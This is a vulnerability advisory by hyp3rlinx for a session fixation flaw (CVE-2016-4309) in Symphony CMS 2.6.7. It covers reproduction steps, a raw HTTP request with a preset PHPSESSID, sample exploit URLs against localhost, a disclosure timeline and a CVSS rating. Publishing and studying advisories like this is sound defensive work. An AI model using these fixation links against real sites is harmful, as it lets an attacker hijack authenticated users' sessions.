@@ -1,0 +1,145 @@
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/SYMPHONY-CMS-SESSION-FIXATION.txt
+
+[+] ISR: APPARITIONSEC
+
+
+Vendor:
+====================
+www.getsymphony.com
+
+
+Product:
+==================
+Symphony CMS v2.6.7
+
+Download:
+http://www.getsymphony.com/download/
+
+
+Symphony is a XSLT-powered open source content management system.
+
+
+Vulnerability Type:
+===================
+Session Fixation
+
+
+CVE Reference:
+==============
+CVE-2016-4309
+
+
+Vulnerability Details:
+=====================
+
+Symphony CMS is prone to "Session Fixation" allowing attackers to preset a
+users PHPSESSID "Session Identifier".
+If the application is deployed using an insecure setup with PHP.INI
+"session.use_only_cookies" not enabled, attackers can then send
+victims a link to the vulnerable application with the "PHPSESSID" already
+initialized as Symphony does not use or call
+"session_regenerate_id()" upon successful user authentication.
+
+Note: as per php.net/manual/en/session.configuration.php
+"session.use_only_cookies=1" is default since PHP 4.3.0.
+
+e.g.
+
+"http://localhost/symphony/?PHPSESSID=APPARITION666".
+
+As Symphonys Session ID is not regenerated it can result in arbitrary
+Session ID being 'Fixated' to a user, if that user authenticates using
+this attacker supplied session fixated link, the attacker can now access
+the affected application from a different Computer/Browser
+and have the same level of access to that of the victim. Default Cookie
+lifetime for Symphony CMS is up to two weeks.
+
+
+
+Reproduction steps:
+=====================
+
+Edit PHP.INI and change following settings to 'session.use_only_cookies=0'
+if applicable, as POC test.
+
+
+1) Telnet localhost 80
+
+2) make HTTP request with a prefixed PHPSESSID
+
+GET /symphony-2.6.7/symphony/?PHPSESSID=PWN3D666 HTTP/1.1
+Host: localhost
+Connection: close
+
+3) Hit enter twice
+
+
+HTTP/1.1 200 OK
+Date: Mon, 16 May 2016 02:06:47 GMT
+Server: Apache/2.4.12 (Win32) OpenSSL/1.0.1l PHP/5.6.8
+X-Powered-By: PHP/5.6.8
+Set-Cookie: PHPSESSID=PWNED666; expires=Mon, 30-May-2016 02:06:48 GMT;
+Max-Age=1209600; path=/symphony-2.6.7; httponly
+Content-Length: 1501
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+Exploit code(s):
+===============
+
+1)
+http://localhost/symphony-2.6.7/symphony/publish/articles/?PHPSESSID=hyp3rlinx
+
+2) http://localhost/symphony-2.6.7/symphony/?PHPSESSID=APPARITION
+
+
+Disclosure Timeline:
+=====================================
+Vendor Notification: May 3, 2016
+Vendor Release Fix: May 23, 2016
+June 20, 2016 : Public Disclosure.
+
+
+Exploitation Method:
+====================
+Remote
+
+
+Severity Level:
+================
+6.8 (Medium)
+CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N
+
+
+
+Description:
+==============================================
+Request Method(s):       [+] GET / POST
+
+
+Vulnerable Product:      [+] Symphony CMS 2.6.7
+
+
+Vulnerable Parameter(s): [+] 'PHPSESSID'
+===============================================
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
